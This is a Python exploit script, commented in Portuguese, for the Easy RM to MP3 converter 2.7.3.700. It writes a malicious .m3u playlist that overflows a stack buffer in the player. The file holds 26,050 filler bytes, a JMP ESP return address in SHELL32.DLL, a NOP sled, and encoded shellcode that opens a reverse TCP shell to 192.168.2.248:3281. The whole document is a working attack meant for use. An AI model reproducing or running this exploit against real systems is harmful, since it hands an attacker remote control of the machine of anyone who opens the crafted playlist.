#Exploit para Easy RM to MP3 converter - 2.7.3.700 [2006-09-29]
#Escrito por: Ivan S. Vargas
#Data: 13/03/2017
#Descricao:
#O exploit gera um arquivo .m3u que ao ser importado pelo
#Easy RM chama uma shell reversa para 192.168.2.248:3281


#shellcode tcp reverso para 192.168.2.248:3281 
#badchars: "\x00\x0d\x0a\x20\x40"
buf =  ""
buf += "\xda\xc0\xd9\x74\x24\xf4\xba\x76\x9b\x07\xda\x58\x2b"
buf += "\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\x26\x88\xe5"
buf += "\x2f\x3a\x46\x6b\xcf\xc2\x97\x0c\x59\x27\xa6\x0c\x3d"
buf += "\x2c\x99\xbc\x35\x60\x16\x36\x1b\x90\xad\x3a\xb4\x97"
buf += "\x06\xf0\xe2\x96\x97\xa9\xd7\xb9\x1b\xb0\x0b\x19\x25"
buf += "\x7b\x5e\x58\x62\x66\x93\x08\x3b\xec\x06\xbc\x48\xb8"
buf += "\x9a\x37\x02\x2c\x9b\xa4\xd3\x4f\x8a\x7b\x6f\x16\x0c"
buf += "\x7a\xbc\x22\x05\x64\xa1\x0f\xdf\x1f\x11\xfb\xde\xc9"
buf += "\x6b\x04\x4c\x34\x44\xf7\x8c\x71\x63\xe8\xfa\x8b\x97"
buf += "\x95\xfc\x48\xe5\x41\x88\x4a\x4d\x01\x2a\xb6\x6f\xc6"
buf += "\xad\x3d\x63\xa3\xba\x19\x60\x32\x6e\x12\x9c\xbf\x91"
buf += "\xf4\x14\xfb\xb5\xd0\x7d\x5f\xd7\x41\xd8\x0e\xe8\x91"
buf += "\x83\xef\x4c\xda\x2e\xfb\xfc\x81\x26\xc8\xcc\x39\xb7"
buf += "\x46\x46\x4a\x85\xc9\xfc\xc4\xa5\x82\xda\x13\xc9\xb8"
buf += "\x9b\x8b\x34\x43\xdc\x82\xf2\x17\x8c\xbc\xd3\x17\x47"
buf += "\x3c\xdb\xcd\xc8\x6c\x73\xbe\xa8\xdc\x33\x6e\x41\x36"
buf += "\xbc\x51\x71\x39\x16\xfa\x18\xc0\xf1\xc5\x75\xc8\xf8"
buf += "\xae\x87\xcc\xf6\xff\x01\x2a\x6c\x10\x44\xe5\x19\x89"
buf += "\xcd\x7d\xbb\x56\xd8\xf8\xfb\xdd\xef\xfd\xb2\x15\x85"
buf += "\xed\x23\xd6\xd0\x4f\xe5\xe9\xce\xe7\x69\x7b\x95\xf7"
buf += "\xe4\x60\x02\xa0\xa1\x57\x5b\x24\x5c\xc1\xf5\x5a\x9d"
buf += "\x97\x3e\xde\x7a\x64\xc0\xdf\x0f\xd0\xe6\xcf\xc9\xd9"
buf += "\xa2\xbb\x85\x8f\x7c\x15\x60\x66\xcf\xcf\x3a\xd5\x99"
buf += "\x87\xbb\x15\x1a\xd1\xc3\x73\xec\x3d\x75\x2a\xa9\x42"
buf += "\xba\xba\x3d\x3b\xa6\x5a\xc1\x96\x62\x6a\x88\xba\xc3"
buf += "\xe3\x55\x2f\x56\x6e\x66\x9a\x95\x97\xe5\x2e\x66\x6c"
buf += "\xf5\x5b\x63\x28\xb1\xb0\x19\x21\x54\xb6\x8e\x42\x7d"

#7CA58265 - JMP ESP -> SHELL32.DLL
JMP_ESP = "\x65\x82\xa5\x7c"
NOP = "\x90"

#com 26054 bytes sobreescreve o EIP
buffer = "A" * (26054 - 4) + JMP_ESP + NOP * 100 + buf

#escrever arquivo 
fp=open("exploitmp3.m3u","w")
fp.write(buffer)
fp.close()

#concluido
print "Shellcode: %s" % len(buf)
print "Buffer: %s" % len(buffer)
print "Arquivo .m3u gravado com sucesso."
